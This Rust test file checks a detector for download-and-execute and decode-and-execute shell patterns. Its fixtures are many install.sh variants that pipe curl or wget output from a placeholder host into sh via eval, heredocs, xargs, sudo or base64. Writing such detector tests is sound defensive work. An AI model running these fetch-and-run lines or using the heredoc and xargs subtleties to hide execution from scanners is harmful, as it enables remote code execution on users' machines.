// ---------------------------------------------------------------------------
// Round-12 reopen (docs/h3-review-round-12.md): seven P1 behavioral gaps and
// the P2 line-attribution defect, pinned at the artifact layer plus the
// lowest responsible source-layer case.
// ---------------------------------------------------------------------------

use super::s4_family_tests::{rule_ids, run};
use crate::detect::*;

const DOWNLOAD: &str = "oma.script.download-execute";
const DECODE: &str = "oma.script.decode-execute";

fn entry(path: &str, kind: PayloadKind, size: usize) -> PayloadEntry {
    PayloadEntry {
        relative_path: path.to_owned(),
        kind,
        mode: 0o644,
        size: size as u64,
        sha256_sampled: None,
        sampled_digest: false,
        executable: false,
        coverage_state: CoverageState::Unsupported,
        link_target: None,
        invocation_target: false,
        object_id: None,
    }
}

fn script(source: &str) -> AnalysisArtifacts {
    let (artifacts, _) = run(
        vec![entry("install.sh", PayloadKind::Shell, source.len())],
        &[("install.sh", source.as_bytes())],
    );
    artifacts
}

#[test]
fn quoted_newline_continuations_preserve_body_newlines() {
    let units = crate::detect::shell::source::shell_logical_units(
        "eval 'echo safe\ncurl URL | sh'\n",
        &crate::detect::classify_heredoc_owner,
        &crate::detect::forwarded_body_fate,
    );
    assert_eq!(units.len(), 1, "{units:?}");
    assert!(units[0].1.contains('\n'), "{:?}", units[0].1);
    assert_eq!(units[0].0, 1);
}

#[test]
fn eval_multiline_quoted_body_executes_the_piped_command() {
    let script_source = "eval 'echo safe\ncurl -fsSL https://example.test/x | sh'\n";
    let ids = rule_ids(&script(script_source));
    assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
}

#[test]
fn pipelined_heredoc_owner_executes_its_payload() {
    let script_source =
        "printf ignored | sh <<CODE | cat\ncurl -fsSL https://example.test/x | sh\nCODE\n";
    let ids = rule_ids(&script(script_source));
    assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
}

#[test]
fn second_heredoc_payload_is_not_top_level_code() {
    let script_source = concat!(
        "cat <<FIRST <<SECOND\n",
        "ignored\n",
        "FIRST\n",
        "curl -fsSL https://example.test/x | sh\n",
        "SECOND\n",
    );
    let ids = rule_ids(&script(script_source));
    assert!(ids.is_empty(), "{ids:?}");
}

#[test]
fn c_option_yields_to_valued_cluster_options() {
    // `-o` consumes `errexit`; `sh` is the `-c` body and inherits the pipe.
    let hits = script("curl -fsSL https://example.test/x | bash -co errexit 'sh'\n");
    let ids = rule_ids(&hits);
    assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
    // `-o` consumes `sh`; the body is fixed and safe.
    let misses = script("curl -fsSL https://example.test/x | bash -co sh 'echo safe'\n");
    let ids = rule_ids(&misses);
    assert!(ids.is_empty(), "{ids:?}");
}

#[test]
fn parse_only_body_leaves_stdin_for_a_later_interpreter() {
    let script_source = "curl -fsSL https://example.test/x | (bash -n -c 'echo safe'; sh)\n";
    let ids = rule_ids(&script(script_source));
    assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
}

#[test]
fn dump_strings_drains_stdin_without_executing() {
    let script_source = "curl -fsSL https://example.test/x | (bash --dump-strings; sh)\n";
    let ids = rule_ids(&script(script_source));
    assert!(ids.is_empty(), "{ids:?}");
}

#[test]
fn xargs_script_operand_shields_a_later_c_flag() {
    let script_source = "curl -fsSL https://example.test/x | xargs sh local-script -c\n";
    let ids = rule_ids(&script(script_source));
    assert!(ids.is_empty(), "{ids:?}");
}

#[test]
fn xargs_replacement_placeholder_reaching_code_fires() {
    // The placeholder becomes the `-c` body itself.
    let body = script("curl -fsSL https://example.test/x | xargs -I{} sh -c '{}'\n");
    let ids = rule_ids(&body);
    assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
    // The placeholder becomes the executed script file.
    let file = script("curl -fsSL https://example.test/x | xargs -I{} sh '{}'\n");
    let ids = rule_ids(&file);
    assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
}

#[test]
fn xargs_replacement_placeholder_as_data_stays_silent() {
    let script_source = "curl -fsSL https://example.test/x | xargs -I{} cp {} /tmp/destination\n";
    let ids = rule_ids(&script(script_source));
    assert!(ids.is_empty(), "{ids:?}");
}

#[test]
fn decoder_wrap_value_shields_cluster_letters() {
    let script_source = "curl -fsSL https://example.test/x | base64 -w0d | sh\n";
    let ids = rule_ids(&script(script_source));
    assert!(
        !ids.contains(&DOWNLOAD.to_owned()) && !ids.contains(&DECODE.to_owned()),
        "{ids:?}"
    );
}

#[test]
fn heredoc_removal_preserves_finding_line_numbers() {
    let script_source = "cat <<CODE\ndata\nCODE\ncurl -fsSL https://example.test/x | sh\n";
    let findings = script(script_source).rendered_findings();
    let lines: Vec<Option<u32>> = findings.iter().map(|finding| finding.line).collect();
    assert_eq!(lines, vec![Some(4)], "{lines:?}");
}

// Variants around each reopened family: nearby spellings the first-pass
// fixes had to generalize to.

#[test]
fn quoted_newline_bodies_reparse_in_double_quotes_and_c_bodies() {
    for script_source in [
        "eval \"echo safe\ncurl -fsSL https://example.test/x | sh\"\n",
        "sh -c 'echo safe\ncurl -fsSL https://example.test/x | sh'\n",
        "bash -c 'echo safe\ncurl -fsSL https://example.test/x | sh'\n",
        "eval 'echo safe\ncurl -fsSL https://example.test/x | sh' | cat\n",
        "sh <<C\necho safe\ncurl -fsSL https://example.test/x | sh\nC\n",
    ] {
        let ids = rule_ids(&script(script_source));
        assert!(
            ids.contains(&DOWNLOAD.to_owned()),
            "{script_source:?}: {ids:?}"
        );
    }
    // A newline that is only data never splits a word into a command.
    let ids = rule_ids(&script("echo 'a\nb' | sh\n"));
    assert!(ids.is_empty(), "{ids:?}");
}

#[test]
fn heredoc_bodies_follow_their_real_dataflow() {
    // Two owned redirects: only the last adjacent body is stdin, and it
    // executes.
    let two_owned = script("sh <<A <<B\necho safe\nA\ncurl -fsSL https://example.test/x | sh\nB\n");
    let ids = rule_ids(&two_owned);
    assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
    // Separate commands own separate redirects; cat's data stays data.
    let two_commands =
        script("cat <<A; sh <<B\nignored\nA\ncurl -fsSL https://example.test/x | sh\nB\n");
    let ids = rule_ids(&two_commands);
    assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
    // A forwarding filter passes the body to its downstream consumer.
    let forwarded = script("cat <<C | sh\ncurl -fsSL https://example.test/x | sh\nC\n");
    let ids = rule_ids(&forwarded);
    assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
    // A group's interpreter owns the heredoc inside it.
    let grouped = script("(sh <<C)\ncurl -fsSL https://example.test/x | sh\nC\n");
    let ids = rule_ids(&grouped);
    assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
    // A fetch beside a data heredoc records no finding by itself.
    let fetched = script("curl -fsSL https://example.test/x > /tmp/f <<A\nignored\nA\n");
    assert!(rule_ids(&fetched).is_empty(), "{:?}", rule_ids(&fetched));
}

#[test]
fn forwarded_heredoc_respects_downstream_modes() {
    // A downstream interpreter that never reads stdin as a script
    // (parse-only, own `-c` body, script file, help exit) leaves the
    // forwarded body unexecuted: no `-c` attach, no finding.
    for script_source in [
        "cat <<C | sh -n\ncurl -fsSL https://example.test/x | sh\nC\n",
        "cat <<C | sh -c 'echo safe'\ncurl -fsSL https://example.test/x | sh\nC\n",
        "cat <<C | sh /usr/local/bin/helper.sh\ncurl -fsSL https://example.test/x | sh\nC\n",
        "cat <<C | bash --help\ncurl -fsSL https://example.test/x | sh\nC\n",
    ] {
        let ids = rule_ids(&script(script_source));
        assert!(ids.is_empty(), "{script_source:?}: {ids:?}");
    }
    // Plain interpreter flags keep stdin-script mode.
    let flags = script("cat <<C | sh -eu\ncurl -fsSL https://example.test/x | sh\nC\n");
    let ids = rule_ids(&flags);
    assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
}

#[test]
fn forwarded_heredoc_follows_the_whole_tail() {
    // The body survives forwarding stages and wrapper chains until the
    // interpreter that executes it.
    for script_source in [
        "cat <<C | cat | sh\ncurl -fsSL https://example.test/x | sh\nC\n",
        "cat <<C | sudo sh\ncurl -fsSL https://example.test/x | sh\nC\n",
        "cat <<C | sudo -u root sh\ncurl -fsSL https://example.test/x | sh\nC\n",
        "cat <<C | env sh\ncurl -fsSL https://example.test/x | sh\nC\n",
        "cat <<C | exec bash\ncurl -fsSL https://example.test/x | sh\nC\n",
        "cat <<C | base64 -d | sh\ncurl -fsSL https://example.test/x | sh\nC\n",
        "cat <<C|sh\ncurl -fsSL https://example.test/x | sh\nC\n",
        "tee <<C | sh\ncurl -fsSL https://example.test/x | sh\nC\n",
        "cat <<C | (sh)\ncurl -fsSL https://example.test/x | sh\nC\n",
    ] {
        let ids = rule_ids(&script(script_source));
        assert!(
            ids.contains(&DOWNLOAD.to_owned()),
            "{script_source:?}: {ids:?}"
        );
    }
    // A stage whose stdout is redirected spends the body on a file
    // before the interpreter downstream ever sees it.
    let sunk =
        script("cat <<C | cat > /tmp/kept | sh\ncurl -fsSL https://example.test/x | sh\nC\n");
    assert!(rule_ids(&sunk).is_empty(), "{:?}", rule_ids(&sunk));
}

#[test]
fn forwarded_heredoc_survives_indirect_stdin_sinks() {
    // The body executes VERBATIM through an indirect stdin-to-code
    // consumer — a static `-c` body consuming stdin, a compound
    // group's interpreter, an explicit stdin-code consumer — with no
    // direct `-c` insertion point. Its lines stay in the source
    // instead of being blanked away, so the finding carries the
    // body's own line.
    for (script_source, line) in [
        (
            "#!/bin/sh\ncat <<C | sh -c sh\ncurl -fsSL https://example.test/x | sh\nC\n",
            3,
        ),
        (
            "#!/bin/sh\ncat <<C | (echo safe; sh)\ncurl -fsSL https://example.test/x | sh\nC\n",
            3,
        ),
        (
            "#!/bin/sh\ncat <<C | source /dev/stdin\ncurl -fsSL https://example.test/x | sh\nC\n",
            3,
        ),
    ] {
        let findings = script(script_source).rendered_findings();
        assert!(
            findings
                .iter()
                .any(|finding| finding.rule_id == DOWNLOAD && finding.line == Some(line)),
            "{script_source:?}: {findings:?}"
        );
    }
    // Kept body lines must not shift later units: the span's line
    // accounting stays exact.
    let findings = script(concat!(
        "#!/bin/sh\n",
        "cat <<C | sh -c sh\n",
        "echo safe\n",
        "curl -fsSL https://example.test/x | sh\n",
        "C\n",
        "wget -qO- https://example.test/x | sh\n",
    ))
    .rendered_findings();
    assert!(
        findings.iter().any(|finding| finding.line == Some(6)),
        "{findings:?}"
    );
}

#[test]
fn forwarded_heredoc_through_xargs_follows_the_input_model() {
    // xargs never runs its input verbatim: unquoted input is word
    // split, and `sh -c` takes the FIRST word as its command body —
    // the rest become positional parameters — so the download
    // pipeline never executes. `-L1` limits lines per invocation but
    // still word-splits each line, so it reads the same.
    for script_source in [
        "#!/bin/sh\ncat <<C | xargs sh -c\ncurl -fsSL https://example.test/x | sh\nC\n",
        "#!/bin/sh\ncat <<C | xargs -L1 sh -c\ncurl -fsSL https://example.test/x | sh\nC\n",
    ] {
        assert!(
            rule_ids(&script(script_source)).is_empty(),
            "{script_source:?}"
        );
    }
    // A quoted input line is ONE item: it becomes the whole `-c`
    // body, and the pipeline executes.
    let quoted =
        script("#!/bin/sh\ncat <<C | xargs sh -c\n\"curl -fsSL https://example.test/x | sh\"\nC\n");
    let findings = quoted.rendered_findings();
    assert!(
        findings
            .iter()
            .any(|finding| finding.rule_id == DOWNLOAD && finding.line == Some(3)),
        "{findings:?}"
    );
    // `-n 2` groups items into repeated invocations: the first item of
    // EVERY batch becomes a `-c` body, so the second invocation
    // executes the quoted download pipeline.
    let batches = script(
        "#!/bin/sh\ncat <<C | xargs -n 2 sh -c\necho safe 'curl -fsSL https://example.test/x | sh'\nC\n",
    );
    let findings = batches.rendered_findings();
    assert!(
        findings
            .iter()
            .any(|finding| finding.rule_id == DOWNLOAD && finding.line == Some(3)),
        "{findings:?}"
    );
    // `-I` replacement into the `-c` body feeds every input line in
    // as code, each at its own line; `-0` passes the whole body as
    // one unprocessed item.
    for (script_source, line) in [
        (
            "#!/bin/sh\ncat <<C | xargs -I{} sh -c '{}'\ncurl -fsSL https://example.test/x | sh\nC\n",
            3,
        ),
        (
            "#!/bin/sh\ncat <<C | xargs -I{} sh -c '{}'\necho safe\ncurl -fsSL https://example.test/x | sh\nC\n",
            4,
        ),
        (
            "#!/bin/sh\ncat <<C | xargs -0 sh -c\ncurl -fsSL https://example.test/x | sh\nC\n",
            3,
        ),
    ] {
        let findings = script(script_source).rendered_findings();
        assert!(
            findings
                .iter()
                .any(|finding| finding.rule_id == DOWNLOAD && finding.line == Some(line)),
            "{script_source:?}: {findings:?}"
        );
    }
    // Script-file and data positions never execute the body text.
    for script_source in [
        "#!/bin/sh\ncat <<C | xargs sh\ncurl -fsSL https://example.test/x | sh\nC\n",
        "#!/bin/sh\ncat <<C | xargs -I{} sh '{}'\ncurl -fsSL https://example.test/x | sh\nC\n",
        "#!/bin/sh\ncat <<C | xargs -I{} cp {} /tmp/destination\ncurl -fsSL https://example.test/x | sh\nC\n",
        "#!/bin/sh\ncat <<C | xargs sh -- -c\ncurl -fsSL https://example.test/x | sh\nC\n",
    ] {
        assert!(
            rule_ids(&script(script_source)).is_empty(),
            "{script_source:?}"
        );
    }
}

#[test]
fn mixed_fate_heredocs_keep_their_physical_lines() {
    // Kept bodies analyze from their own isolated unit groups, so they
    // report at their physical lines; attached bodies grow the header,
    // whose surplus the blank sections absorb — the span's total, and
    // every later unit's line, stays exact either way.
    let findings = script(concat!(
        "cat <<A | sh -c sh; sh <<B\n",
        "curl -fsSL https://example.test/x | sh\n",
        "A\n",
        "echo safe\n",
        "echo safe2\n",
        "B\n",
        "wget -qO- https://example.test/x | sh\n",
    ))
    .rendered_findings();
    // The kept body reports on its physical line 2...
    assert!(
        findings
            .iter()
            .any(|finding| finding.rule_id == DOWNLOAD && finding.line == Some(2)),
        "{findings:?}"
    );
    // ...and the later unit keeps its original line.
    assert!(
        findings
            .iter()
            .any(|finding| finding.rule_id == DOWNLOAD && finding.line == Some(7)),
        "{findings:?}"
    );
}

#[test]
fn valued_options_defer_c_capture_across_clusters() {
    for script_source in [
        "curl -fsSL https://example.test/x | bash -cO extglob 'sh'\n",
        "curl -fsSL https://example.test/x | bash -O extglob -c 'sh'\n",
    ] {
        let ids = rule_ids(&script(script_source));
        assert!(
            ids.contains(&DOWNLOAD.to_owned()),
            "{script_source:?}: {ids:?}"
        );
    }
}

#[test]
fn parse_only_drains_only_what_it_parses() {
    // `-D` parses stdin without executing: the pipe is spent.
    let drains = script("curl -fsSL https://example.test/x | (bash -D; sh)\n");
    assert!(rule_ids(&drains).is_empty(), "{:?}", rule_ids(&drains));
    let parses = script("curl -fsSL https://example.test/x | (bash -n; sh)\n");
    assert!(rule_ids(&parses).is_empty(), "{:?}", rule_ids(&parses));
    let body = script("curl -fsSL https://example.test/x | bash -n -c 'echo safe'\n");
    assert!(rule_ids(&body).is_empty(), "{:?}", rule_ids(&body));
}

#[test]
fn xargs_option_arity_and_placeholder_positions() {
    // A placeholder inside `eval` executes the input.
    let evals = script("curl -fsSL https://example.test/x | xargs -I% sh -c 'eval %'\n");
    let ids = rule_ids(&evals);
    assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
    // The long `--replace` spelling behaves like `-I`.
    let long = script("curl -fsSL https://example.test/x | xargs --replace={} sh -c '{}'\n");
    let ids = rule_ids(&long);
    assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
    // Valued xargs options are consumed before the wrapped command.
    let valued = script("curl -fsSL https://example.test/x | xargs -n 2 sh -c\n");
    let ids = rule_ids(&valued);
    assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
    // `--` pins the script operand; a later `-c` spelling is its argument.
    let pinned = script("curl -fsSL https://example.test/x | xargs sh -- -c\n");
    assert!(rule_ids(&pinned).is_empty(), "{:?}", rule_ids(&pinned));
    // A placeholder in a data position never executes the input.
    let data = script("curl -fsSL https://example.test/x | xargs -I{} echo {}\n");
    assert!(rule_ids(&data).is_empty(), "{:?}", rule_ids(&data));
}

#[test]
fn decoder_width_values_are_option_payload() {
    // Separate `-w 0` width then decode: both families fire.
    let both = script("curl -fsSL https://example.test/x | base64 -w 0 -d | sh\n");
    let ids = rule_ids(&both);
    assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
    assert!(ids.contains(&DECODE.to_owned()), "{ids:?}");
    // `0di` is the width value, not three flags.
    let width = script("curl -fsSL https://example.test/x | base64 -w0di | sh\n");
    assert!(rule_ids(&width).is_empty(), "{:?}", rule_ids(&width));
    // base32 shares the arity rule.
    let base32 = script("curl -fsSL https://example.test/x | base32 -di | sh\n");
    let ids = rule_ids(&base32);
    assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
}
